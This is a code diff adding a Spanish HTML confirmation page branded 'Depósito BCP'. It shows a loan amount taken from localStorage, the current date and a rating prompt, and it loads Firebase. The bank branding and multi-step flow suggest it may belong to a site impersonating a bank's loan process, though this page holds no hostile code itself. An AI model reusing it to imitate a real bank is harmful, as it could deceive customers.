@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="assets/img/favicon.ico" rel="icon" type="image/x-icon" />
+  <title>Depósito BCP</title>
+  <link rel="stylesheet" href="assets/css/index9.css">
+  <!-- Firebase App y Firestore desde CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+</head>
+
+<body>
+
+  <div class="header">
+    <img src="assets/img/bcp-dark-default.svg" alt="BCP" style="height: 30px;">
+    <div class="menu-icon">&#9776;</div>
+  </div>
+
+  <div class="progress-container">
+    <div class="step completed"><span>✓</span></div>
+    <div class="line"></div>
+    <div class="step completed"><span>✓</span></div>
+    <div class="line"></div>
+    <div class="step completed"><span>✓</span></div>
+    <div class="line"></div>
+    <div class="step completed"><span>✓</span></div>
+  </div>
+
+
+  <div class="container">
+    <img src="assets/img/celular.png" class="illustration" alt="Ilustración">
+
+    <h2>¡Listo! Te depositaremos</h2>
+
+    <div class="monto" id="monto"></div>
+    <div class="fecha" id="fecha"></div>
+
+
+    <div class="divider"></div>
+
+    <div class="rating-text">Califica tu experiencia</div>
+    <div class="stars">★ ★ ★ ★ ★</div>
+  </div>
+
+  <script>
+    // Obtener monto desde localStorage
+    let monto = localStorage.getItem('montoPrestamo');
+
+    // Eliminar cualquier símbolo "S/" que venga por error
+    if (monto) {
+      monto = monto.replace('S/', '').trim(); // limpia si viene con símbolo
+      document.getElementById('monto').textContent = 'S/ ' + monto;
+    } else {
+      document.getElementById('monto').textContent = 'S/ 0.00';
+    }
+
+    // Obtener fecha y hora actual
+    const fecha = new Date();
+    const opciones = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+    const hora = fecha.toLocaleTimeString('es-PE', { hour: '2-digit', minute: '2-digit' });
+    const fechaFormateada = fecha.toLocaleDateString('es-PE', opciones);
+    document.getElementById('fecha').textContent = `${fechaFormateada} - ${hora}`;
+
+    // Eliminar el monto almacenado para no reutilizarlo
+    localStorage.removeItem('montoPrestamo');
+  </script>
+
+  <script src="assets/js/flotante2.js"></script>
+  <script src="firebase/config.js"></script>
+  <script src="assets/js/AuthGuard.js"></script>
+</body>
+
+</html>
